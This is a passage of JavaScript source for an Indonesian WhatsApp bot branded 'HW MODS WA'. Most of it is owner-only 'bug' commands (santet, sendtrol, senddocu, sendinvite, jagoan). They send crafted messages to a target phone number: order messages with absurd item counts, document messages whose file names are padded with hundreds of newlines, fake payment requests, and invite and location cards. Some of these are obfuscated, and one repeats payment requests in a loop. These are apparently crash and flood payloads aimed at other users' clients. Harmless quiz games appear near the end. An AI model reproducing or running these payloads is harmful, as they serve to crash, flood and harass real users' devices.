_0x38ab1e(_0x246f3d-0x56d,_0x175e86,_0xba80d8-0xe,_0x246f3d-0x6f,_0x175e86-0x1ca);}try{if(_0x42904b[_0x4fa6e4(0x642,0x567,0x5ab,0x582,0x513)](_0x42904b[_0x20b047(0x51b,0x4f0,0x3c8,0x475,0x50a)],_0x42904b[_0x499a7f(0x11f,0x19e,0x100,0x247,0x141)])){var _0xdbd229=_0x2c4717[_0x179c9d(0x53f,0x58c,0x5c2,0x61a,0x554)](_0x3f3a2f,arguments);return _0x1a44bd=null,_0xdbd229;}else{if(_0x550cc1){if(_0x42904b[_0x20b047(0x561,0x51a,0x4db,0x4b0,0x4a1)](_0x42904b[_0x756043(-0x81,0x2d,-0x4,0x63,-0x1f)],_0x42904b[_0x499a7f(0x19a,0x150,0x101,0x18d,0x1bd)]))_0x42904b[_0x756043(0xc,-0x25,-0xbe,-0x5,-0x56)](_0x4fb036,0x2*0x603+0x1*-0x268d+0x1a87);else return _0x4182aa;}else{if(_0x42904b[_0x179c9d(0x5fb,0x608,0x55c,0x4f4,0x5ae)](_0x42904b[_0x4fa6e4(0x65a,0x694,0x6b0,0x692,0x6be)],_0x42904b[_0x4fa6e4(0x5e7,0x551,0x5ea,0x58a,0x645)]))_0x42904b[_0x20b047(0x43f,0x438,0x482,0x4d4,0x496)](_0x4182aa,-0x1c52+0x20d+0x1a45);else return function(_0x54732d){}[_0x499a7f(0x1c3,0x228,0x299,0x28a,0x18e)+_0x179c9d(0x5a8,0x5b9,0x563,0x53e,0x4ae)+'r'](_0x42904b[_0x179c9d(0x4c7,0x471,0x510,0x5b4,0x56b)])[_0x20b047(0x4ef,0x54e,0x4dc,0x543,0x592)](_0x42904b[_0x179c9d(0x48e,0x473,0x4f5,0x56b,0x54e)]);}}}catch(_0x51213c){}}
}
break
case 'jaditroli': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
let teks = `${q}`
{
a = await haikal.sendMessage(from, {react: {  key: { remoteJid: from, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${teks}`,
"orderTitle": `${teks}`,
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m })
haikal.relayMessage(from, order.message, { messageId: order.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadilokas': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": ` ${teks} ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m })
haikal.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadikatalog': {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) throw 'Reply Image/sticker'
let teks = `${q}`
{
function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281214281312','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':ppnyauser,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':m});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
sticSukses(from)
}
}
break
//=================================================//
case 'jadidocu': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
let teks = `${q}`
{
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadidarknes': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
let teks = `${q}`
{
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibuginvite': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"groupName": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"caption": `🔥 ${teks} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m })
haikal.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibugpayment' : {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
sticSukses(from)
let teks = `${q}`
{
haikal.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
//=================================================//
case 'jadibugsw': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`
let teks = `${q}`
{
joau = fs.readFileSync('./baseikal/video/haikal.mp4')
haikal.sendMessage(from, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
//=================================================//
case 'sendtrol': case 'sendtrol3': case 'sendtrol4': case 'sendtrol5': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": " BY ʜᴡ ᴍᴏᴅꜱ ᴡᴀ",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, order.message, { messageId: order.key.id })
sticSukses(from)
}
break
//=================================================//
case 'senddocu': case 'senddocu2': case 'senddocu3': case 'senddocu4': case 'senddocu5': {
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = q.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ☆DARKNESS⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: from })
haikal.relayMessage(bnnd, document.message, { messageId: document.key.id })
sticSukses(from)
}
break
//=================================================//
//=================================================//
case 'sendlokas': case 'sendlokas3': case 'sendlokas4': case 'sendlokas5': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
break
//=================================================//
case 'sendlokas2': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var location = generateWAMessageFromContent(from, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, location.message, { messageId: location.key.id })
sticSukses(from)
}
break
//=================================================//
case 'sendtrol2': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${ngazap(prefix)}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, order.message, { messageId: order.key.id })
sticSukses(from)
}
break
//=================================================//
//=================================================//
//=================================================//
// BUG OWNER
case 'santet': case 'santet2': case 'santet3': case 'santet4': case 'santet5': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`,
}
}}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
sticSukses(from)
}
break
//=================================================//
case 'jagoan' : {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
//=================================================//
case 'sendinvite': case 'sendinvite2': case 'sendinvite3': case 'sendinvite4': case 'sendinvite5':{
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${ngazap(prefix)}`,
"groupName": `MY NAME ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, groupInvite.message, { messageId: groupInvite.key.id })
m.reply(`Sukses Mengirim Bug Ke ${bnnd} !!!`)
}
break


    case 'family100': {
    if (!isCreator) return m.reply(mess.owner)
                if ('family100'+from in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+from] = {
                    id: 'family100'+from,
                    pesan: await haikal.sendText(from, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'tebak': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await haikal.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    haikal.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{ quoted: m })         
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    haikal.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, { quoted: m })         
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    haikal.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, { quoted: m })                    
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    haikal.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
